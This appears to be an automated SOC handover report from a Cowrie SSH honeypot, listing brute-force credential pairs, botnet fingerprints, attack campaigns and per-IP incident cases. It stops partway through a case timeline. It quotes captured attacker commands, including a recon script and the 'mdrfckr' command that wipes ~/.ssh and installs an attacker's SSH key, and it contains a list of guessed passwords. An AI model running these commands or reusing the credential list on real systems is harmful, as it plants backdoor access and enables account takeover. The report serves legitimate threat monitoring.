# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-01 |
| **Generated At** | 2026-08-01T22:58:52Z |
| **Shift Time** | 22:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **108** |
| Confirmed Threats | **99** |
| False Positives Filtered | **9** (8.3%) |
| Unique Attacker IPs | **59** |
| Countries of Origin | **27** |
| High Severity Cases | **59** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **49** |
| Malware Samples Analyzed | **4** HIGH · **26** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **84** |
| Unique Credential Pairs | **42** |
| Unique Usernames | **11** |
| Unique Passwords | **41** |
| Successful Auth Pairs | **65** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 46 |
| `default` | 8 |
| `admin1` | 5 |
| `user` | 5 |
| `nobody` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `smo@@kkklss` | 6 |
| `` | 5 |
| `admin1` | 5 |
| `nobody99` | 5 |
| `support` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `smo@@kkklss` | 6 |
| `root` | `` | 5 |
| `admin1` | `admin1` | 5 |
| `nobody` | `nobody99` | 5 |
| `support` | `support` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root666` | `10.0.0.73` | 2026-08-01T20:57:53 |
| `operator` | `qwer1234` | `10.0.0.73` | 2026-08-01T21:01:53 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-01T21:01:54 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-01T21:01:55 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-01T21:02:03 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-01T21:08:52 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-01T21:08:52 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-01T21:08:57 |
| `support` | `support` | `10.0.0.73` | 2026-08-01T21:11:25 |
| `root` | `root666` | `124.239.129.2` | 2026-08-01T21:15:57 |
| `root` | `root666` | `103.83.23.169` | 2026-08-01T21:16:10 |
| `root` | `asdzx123` | `41.63.62.103` | 2026-08-01T21:21:33 |
| `345gs5662d34` | `345gs5662d34` | `41.63.62.103` | 2026-08-01T21:21:37 |
| `root` | `3245gs5662d34` | `41.63.62.103` | 2026-08-01T21:21:39 |
| `admin` | `admin33` | `60.223.245.120` | 2026-08-01T21:24:35 |
| `admin1` | `admin1` | `10.0.0.73` | 2026-08-01T21:32:14 |
| `admin1` | `admin1` | `61.184.128.210` | 2026-08-01T21:33:56 |
| `user` | `raspberry` | `10.0.0.73` | 2026-08-01T21:36:50 |
| `default` | `default123456` | `10.0.0.73` | 2026-08-01T21:39:50 |
| `admin1` | `admin1` | `197.242.170.10` | 2026-08-01T21:50:06 |
| `admin1` | `admin1` | `117.69.255.239` | 2026-08-01T21:50:18 |
| `root` | `admin` | `10.0.0.73` | 2026-08-01T21:51:35 |
| `user` | `raspberry` | `182.76.71.82` | 2026-08-01T21:53:54 |
| `user` | `raspberry` | `177.72.87.7` | 2026-08-01T21:54:03 |
| `default` | `default123456` | `119.200.229.33` | 2026-08-01T21:58:31 |
| `default` | `default123456` | `200.232.114.71` | 2026-08-01T21:58:39 |
| `root` | `999` | `210.4.68.72` | 2026-08-01T21:59:05 |
| `root` | `!root` | `92.118.39.50` | 2026-08-01T22:04:13 |
| `nobody` | `nobody99` | `10.0.0.73` | 2026-08-01T22:06:24 |
| `root` | `111111` | `92.118.39.50` | 2026-08-01T22:06:40 |
| `nobody` | `nobody99` | `177.174.89.99` | 2026-08-01T22:08:07 |
| `root` | `123123` | `92.118.39.50` | 2026-08-01T22:09:14 |
| `root` | `1234` | `92.118.39.50` | 2026-08-01T22:11:46 |
| `support` | `support` | `176.53.159.196` | 2026-08-01T22:12:48 |
| `root` | `12345` | `92.118.39.50` | 2026-08-01T22:14:22 |
| `root` | `12345678` | `92.118.39.50` | 2026-08-01T22:19:38 |
| `root` | `﻿------fuck------` | `192.220.58.65` | 2026-08-01T22:20:38 |
| `root` | `123456789` | `92.118.39.50` | 2026-08-01T22:22:07 |
| `nobody` | `nobody99` | `65.20.198.159` | 2026-08-01T22:24:24 |
| `nobody` | `nobody99` | `179.184.85.167` | 2026-08-01T22:24:32 |
| `root` | `P@ssw0rd` | `92.118.39.50` | 2026-08-01T22:24:32 |
| `root` | `Password1` | `92.118.39.50` | 2026-08-01T22:27:11 |
| `root` | `1234567` | `163.192.48.255` | 2026-08-01T22:27:55 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-01T22:29:09 |
| `root` | `Root123` | `92.118.39.50` | 2026-08-01T22:30:08 |
| `ubnt` | `ubnt2017` | `223.100.248.64` | 2026-08-01T22:32:36 |
| `root` | `admin` | `92.118.39.50` | 2026-08-01T22:32:39 |
| `ubnt` | `ubnt2017` | `14.97.77.182` | 2026-08-01T22:32:44 |
| `ubnt` | `ubnt2017` | `93.177.157.179` | 2026-08-01T22:32:49 |
| `ubnt` | `ubnt2017` | `34.146.248.7` | 2026-08-01T22:32:57 |
| `default` | `default2` | `182.156.80.11` | 2026-08-01T22:33:44 |
| `default` | `default2` | `64.53.7.231` | 2026-08-01T22:33:51 |
| `root` | `admin123` | `92.118.39.50` | 2026-08-01T22:35:13 |
| `root` | `alpine` | `92.118.39.50` | 2026-08-01T22:37:36 |
| `root` | `changeme` | `92.118.39.50` | 2026-08-01T22:40:00 |
| `user` | `user33` | `10.0.0.73` | 2026-08-01T22:40:37 |
| `root` | `default` | `92.118.39.50` | 2026-08-01T22:42:22 |
| `root` | `letmein` | `92.118.39.50` | 2026-08-01T22:44:46 |
| `default` | `default2` | `10.0.0.73` | 2026-08-01T22:45:28 |
| `root` | `passw0rd` | `92.118.39.50` | 2026-08-01T22:47:05 |
| `root` | `computer` | `10.0.0.73` | 2026-08-01T22:48:15 |
| `www` | `1` | `189.161.43.93` | 2026-08-01T22:52:23 |
| `345gs5662d34` | `345gs5662d34` | `189.161.43.93` | 2026-08-01T22:52:25 |
| `www` | `3245gs5662d34` | `189.161.43.93` | 2026-08-01T22:52:26 |
| `root` | `` | `94.154.43.91` | 2026-08-01T22:54:45 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **108** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 26 |
| Go SSH scanner | 24 |
| Paramiko (Python) | 12 |
| libssh | 6 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 20 | 20 |
| `2ec37a7cc8da...` | Mirai/variant | 18 | 1 |
| `a2de0f306611...` | Mirai/variant | 12 | 2 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `9052c4ab4164...` | Mirai/variant | 3 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 20 | 20 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 18 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 12 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `9052c4ab4164...` | OpenSSH | 3 | 3 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 3 | 2 | — |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 17 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.50`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.91`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `41.63.62.103`, `189.161.43.93`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **59** |
| Unique ASNs | **48** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS35042` | Layer7 Networks GmbH | 2 | HIGH |
| `AS45820` | Tata Teleservices ISP AS | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 1 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (59)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0bff4813741b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-01 21:01 |
| **Last Seen** | 2026-08-01 21:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:01:54` | `cowrie.session.connect` |
| `2026-08-01 21:01:54` | `cowrie.client.version` |
| `2026-08-01 21:01:54` | `cowrie.client.kex` |
| `2026-08-01 21:01:54` | `cowrie.login.success` |
| `2026-08-01 21:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4fc41bbbb3e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-01 21:01 |
| **Last Seen** | 2026-08-01 21:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:01:54` | `cowrie.session.connect` |
| `2026-08-01 21:01:54` | `cowrie.client.version` |
| `2026-08-01 21:01:54` | `cowrie.client.kex` |
| `2026-08-01 21:01:55` | `cowrie.login.success` |
| `2026-08-01 21:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d46652ed8d99

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-01 21:02 |
| **Last Seen** | 2026-08-01 21:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:02:02` | `cowrie.session.connect` |
| `2026-08-01 21:02:02` | `cowrie.client.version` |
| `2026-08-01 21:02:02` | `cowrie.client.kex` |
| `2026-08-01 21:02:03` | `cowrie.login.success` |
| `2026-08-01 21:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dd46689bdcf

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-01 21:02 |
| **Last Seen** | 2026-08-01 21:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:02:03` | `cowrie.session.connect` |
| `2026-08-01 21:02:03` | `cowrie.client.version` |
| `2026-08-01 21:02:03` | `cowrie.client.kex` |
| `2026-08-01 21:02:04` | `cowrie.login.success` |
| `2026-08-01 21:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc86b2909ad5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 21:08 |
| **Last Seen** | 2026-08-01 21:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:08:52` | `cowrie.session.connect` |
| `2026-08-01 21:08:52` | `cowrie.client.version` |
| `2026-08-01 21:08:52` | `cowrie.client.kex` |
| `2026-08-01 21:08:52` | `cowrie.login.success` |
| `2026-08-01 21:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54413be656fa

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 21:08 |
| **Last Seen** | 2026-08-01 21:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:08:52` | `cowrie.session.connect` |
| `2026-08-01 21:08:52` | `cowrie.client.version` |
| `2026-08-01 21:08:52` | `cowrie.client.kex` |
| `2026-08-01 21:08:52` | `cowrie.login.success` |
| `2026-08-01 21:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4709213f6e7f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 21:08 |
| **Last Seen** | 2026-08-01 21:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:08:57` | `cowrie.session.connect` |
| `2026-08-01 21:08:57` | `cowrie.client.version` |
| `2026-08-01 21:08:57` | `cowrie.client.kex` |
| `2026-08-01 21:08:57` | `cowrie.login.success` |
| `2026-08-01 21:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e94df96ac32c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 21:08 |
| **Last Seen** | 2026-08-01 21:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:08:57` | `cowrie.session.connect` |
| `2026-08-01 21:08:57` | `cowrie.client.version` |
| `2026-08-01 21:08:57` | `cowrie.client.kex` |
| `2026-08-01 21:08:57` | `cowrie.login.success` |
| `2026-08-01 21:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca0a9d115c5e

| Field | Detail |
|---|---|
| **Source IP** | `124.239.129[.]2` |
| **First Seen** | 2026-08-01 21:15 |
| **Last Seen** | 2026-08-01 21:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:15:55` | `cowrie.session.connect` |
| `2026-08-01 21:15:55` | `cowrie.client.version` |
| `2026-08-01 21:15:55` | `cowrie.client.kex` |
| `2026-08-01 21:15:57` | `cowrie.login.success` |
| `2026-08-01 21:15:58` | `cowrie.direct-tcpip.request` |
| `2026-08-01 21:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.129[.]2` to AbuseIPDB if not already reported
- [ ] Block `124.239.129[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fee3b004656

| Field | Detail |
|---|---|
| **Source IP** | `103.83.23[.]169` |
| **First Seen** | 2026-08-01 21:16 |
| **Last Seen** | 2026-08-01 21:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:16:08` | `cowrie.session.connect` |
| `2026-08-01 21:16:08` | `cowrie.client.version` |
| `2026-08-01 21:16:08` | `cowrie.client.kex` |
| `2026-08-01 21:16:10` | `cowrie.login.success` |
| `2026-08-01 21:16:10` | `cowrie.direct-tcpip.request` |
| `2026-08-01 21:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.83.23[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.83.23[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f90e9e55193f

| Field | Detail |
|---|---|
| **Source IP** | `41.63.62[.]103` |
| **First Seen** | 2026-08-01 21:21 |
| **Last Seen** | 2026-08-01 21:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:21:31` | `cowrie.session.connect` |
| `2026-08-01 21:21:31` | `cowrie.client.version` |
| `2026-08-01 21:21:31` | `cowrie.client.kex` |
| `2026-08-01 21:21:33` | `cowrie.login.success` |
| `2026-08-01 21:21:34` | `cowrie.session.params` |
| `2026-08-01 21:21:34` | `cowrie.command.input` |
| `2026-08-01 21:21:34` | `cowrie.command.failed` |
| `2026-08-01 21:21:34` | `cowrie.log.closed` |
| `2026-08-01 21:21:35` | `cowrie.session.params` |
| `2026-08-01 21:21:35` | `cowrie.command.input` |
| `2026-08-01 21:21:35` | `cowrie.session.file_download` |
| `2026-08-01 21:21:35` | `cowrie.log.closed` |
| `2026-08-01 21:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.63.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `41.63.62[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6506524d384

| Field | Detail |
|---|---|
| **Source IP** | `41.63.62[.]103` |
| **First Seen** | 2026-08-01 21:21 |
| **Last Seen** | 2026-08-01 21:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:21:36` | `cowrie.session.connect` |
| `2026-08-01 21:21:36` | `cowrie.client.version` |
| `2026-08-01 21:21:36` | `cowrie.client.kex` |
| `2026-08-01 21:21:37` | `cowrie.login.success` |
| `2026-08-01 21:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.63.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `41.63.62[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31e0f1a1fe13

| Field | Detail |
|---|---|
| **Source IP** | `41.63.62[.]103` |
| **First Seen** | 2026-08-01 21:21 |
| **Last Seen** | 2026-08-01 21:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:21:37` | `cowrie.session.connect` |
| `2026-08-01 21:21:37` | `cowrie.client.version` |
| `2026-08-01 21:21:38` | `cowrie.client.kex` |
| `2026-08-01 21:21:39` | `cowrie.login.success` |
| `2026-08-01 21:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.63.62[.]103` to AbuseIPDB if not already reported
- [ ] Block `41.63.62[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-431f9718891c

| Field | Detail |
|---|---|
| **Source IP** | `60.223.245[.]120` |
| **First Seen** | 2026-08-01 21:24 |
| **Last Seen** | 2026-08-01 21:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:24:32` | `cowrie.session.connect` |
| `2026-08-01 21:24:33` | `cowrie.client.version` |
| `2026-08-01 21:24:33` | `cowrie.client.kex` |
| `2026-08-01 21:24:35` | `cowrie.login.success` |
| `2026-08-01 21:24:36` | `cowrie.direct-tcpip.request` |
| `2026-08-01 21:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.245[.]120` to AbuseIPDB if not already reported
- [ ] Block `60.223.245[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16183c5e43f4

| Field | Detail |
|---|---|
| **Source IP** | `61.184.128[.]210` |
| **First Seen** | 2026-08-01 21:33 |
| **Last Seen** | 2026-08-01 21:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:33:53` | `cowrie.session.connect` |
| `2026-08-01 21:33:54` | `cowrie.client.version` |
| `2026-08-01 21:33:54` | `cowrie.client.kex` |
| `2026-08-01 21:33:56` | `cowrie.login.success` |
| `2026-08-01 21:33:57` | `cowrie.direct-tcpip.request` |
| `2026-08-01 21:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.184.128[.]210` to AbuseIPDB if not already reported
- [ ] Block `61.184.128[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d5d75107003

| Field | Detail |
|---|---|
| **Source IP** | `197.242.170[.]10` |
| **First Seen** | 2026-08-01 21:50 |
| **Last Seen** | 2026-08-01 21:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 21:50:03` | `cowrie.session.connect` |
| `2026-08-01 21:50:04` | `cowrie.client.version` |
| `2026-08-01 21:50:04` | `cowrie.client.kex` |
| `2026-08-01 21:50:06` | `cowrie.login.success` |
| `2026-08-01 21:50:06` | `cowrie.direct-tcpip.request` |
| `2026-08-01 21:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.242.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `197.242.170[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a75dca415f0

| Field | Detail |
|---|---|
| **Source IP** | `117.69.255[.]239` |
| **First Seen** | 2026-08-01 21:50 |
| **Last Seen** | 2026-08-01 21:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

